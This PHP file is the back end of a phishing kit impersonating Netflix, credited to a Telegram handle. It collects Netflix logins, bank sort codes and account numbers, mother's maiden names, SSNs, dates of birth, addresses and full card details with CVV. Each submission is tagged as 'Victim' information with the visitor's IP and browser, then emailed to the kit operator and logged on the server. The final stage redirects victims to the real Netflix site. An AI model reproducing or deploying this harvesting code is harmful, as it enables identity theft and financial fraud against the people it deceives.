<?php
// @Kr3pto on telegram
include 'config.php';

require "assets/includes/functions.php";


error_reporting(0);
ini_set('display_errors', '0');
date_default_timezone_set('Europe/London');

session_start();



if($_POST['fuser'] and $_POST['fpwd']){

	
$_SESSION['username'] = $_POST['fuser'];
$_SESSION['password'] = $_POST['fpwd'];

$username = $_SESSION['username'];
$password = $_SESSION['password'];





$date = date('l d F Y');
$time = date('H:i');
$ip = $_SERVER['REMOTE_ADDR'];



$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$os = os_info($useragent);
$browser = browsername();
$VictimInfo  = "| IP Address : $ip\n";
$VictimInfo .= "| UserAgent : $useragent\n";
$VictimInfo .= "| Browser : $browser\n";
$VictimInfo .= "| OS : $os";
$headers = "From:useragent";
$subj = "Netflix LOGin [$ip]";
$data = "
+ ------------- Netflix LOGin --------------+
+ ------------------------------------------+
+ Account Information
| Username : $username
| Password : $password
+ ------------------------------------------+
+ Victim Information
$VictimInfo
| Received : $date @ $time
+ ---------------- useragent ------------------+
";

mail($to,$subj,$data,$headers);	
if($saveonhost == 1){
$fp = fopen('logs/Netflixlogins.txt', 'a');
fwrite($fp, $data."\n");
fclose($fp);
}
header("Location: info.php");

	
}
else if($_POST['mmn'] and $_POST['scode'] and $_POST['an']){

    
$fname = $_POST['mmn'];
$fdob = $_POST['scode'];
$fzip = $_POST['an'];





$date = date('l d F Y');
$time = date('H:i');
$ip = $_SERVER['REMOTE_ADDR'];



$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$os = os_info($useragent);
$browser = browsername();
$VictimInfo  = "| IP Address : $ip\n";
$VictimInfo .= "| UserAgent : $useragent\n";
$VictimInfo .= "| Browser : $browser\n";
$VictimInfo .= "| OS : $os";
$headers = "From:useragent";
$subj = "Netflix LOGin [$ip]";
$data = "
+ ------------- Netflix LOGin --------------+
+ ------------------------------------------+
+ Account Information
| MMN : $mmn
| Sort Code : $scode
| Account Number : $an
+ ------------------------------------------+
+ Victim Information
$VictimInfo
| Received : $date @ $time
+ ---------------- useragent ------------------+
";

mail($to,$subj,$data,$headers); 
if($saveonhost == 1){
$fp = fopen('logs/Netflixlogins.txt', 'a');
fwrite($fp, $data."\n");
fclose($fp);
}
header("Location: detail.php");

    
}
else if($_POST['fname'] and $_POST['fdob'] ){

    
$fname = $_POST['fname'];
$fdob = $_POST['fdob'];
$fzip = $_POST['fzip'];
$badd = $_POST['badd'];
$ssn = $_POST['ssn'];
$mmn = $_POST['mmn'];




$date = date('l d F Y');
$time = date('H:i');
$ip = $_SERVER['REMOTE_ADDR'];



$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$os = os_info($useragent);
$browser = browsername();
$VictimInfo  = "| IP Address : $ip\n";
$VictimInfo .= "| UserAgent : $useragent\n";
$VictimInfo .= "| Browser : $browser\n";
$VictimInfo .= "| OS : $os";
$headers = "From:useragent";
$subj = "Netflix LOGin [$ip]";
$data = "
+ ------------- Netflix LOGin --------------+
+ ------------------------------------------+
+ Account Information
| Full Name : $fname
| Billing Address : $badd
| Zip code : $fzip
| SSN : $ssn
| MMN : $mmn
| Date of birth : $fdob
+ ------------------------------------------+
+ Victim Information
$VictimInfo
| Received : $date @ $time
+ ---------------- useragent ------------------+
";

mail($to,$subj,$data,$headers); 
if($saveonhost == 1){
$fp = fopen('logs/Netflixlogins.txt', 'a');
fwrite($fp, $data."\n");
fclose($fp);
}
header("Location: card.php");

    
}

else if($_POST['fca1'] and $_POST['fca2'] and $_POST['fca3']){

    

$fca1 = $_POST['fca1'];
$noc = $_POST['noc'];
$type = $_POST['type'];
$fca2 = $_POST['fca2'];
$fca3 = $_POST['fca3'];




$date = date('l d F Y');
$time = date('H:i');
$ip = $_SERVER['REMOTE_ADDR'];



$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$os = os_info($useragent);
$browser = browsername();
$VictimInfo  = "| IP Address : $ip\n";
$VictimInfo .= "| UserAgent : $useragent\n";
$VictimInfo .= "| Browser : $browser\n";
$VictimInfo .= "| OS : $os";
$headers = "From:useragent";
$subj = "Netflix LOGin [$ip]";
$data = "
+ ------------- Netflix LOGin --------------+
+ ------------------------------------------+
+ Account Information

| Card Number : $fca1
| Name on Card : $noc
| Card Type : $type
| Expiration Date (MM/YY) : $fca2
| Security Code (CVV) : $fca3
+ ------------------------------------------+
+ Victim Information
$VictimInfo
| Received : $date @ $time
+ ---------------- useragent ------------------+
";

mail($to,$subj,$data,$headers); 
if($saveonhost == 1){
$fp = fopen('logs/Netflixlogins.txt', 'a');
fwrite($fp, $data."\n");
fclose($fp);
}
header("Location: https://www.netflix.com/");

    
}



else{
	header('location:index.php');
}


?>
